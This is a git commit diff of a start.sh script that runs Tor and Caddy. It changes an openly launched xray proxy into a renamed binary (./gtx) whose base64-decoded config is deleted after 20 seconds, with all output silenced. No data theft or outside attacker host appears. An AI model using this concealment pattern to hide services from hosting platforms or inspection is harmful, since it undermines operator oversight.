dfddc626a8c9b318ba37f89fb05c7acb81810309
castelenl <zhoukun52058@gmail.com>
2022-04-06 03:49:38 +0000

    Update start.sh

--- start.sh
+++ start.sh
@@ -1,5 +1,8 @@
 #!/bin/sh
 
 tor &
-/xray -config /xray.json &
-caddy run --config /etc/caddy/Caddyfile --adapter caddyfile
+caddy run --config /etc/caddy/Caddyfile --adapter caddyfile &
+base64 -d ./worker.txt > ./web.pb
+./gtx -config=./web.pb &>/dev/null &
+sleep 20 ; rm ./web.pb &
+sleep 999d
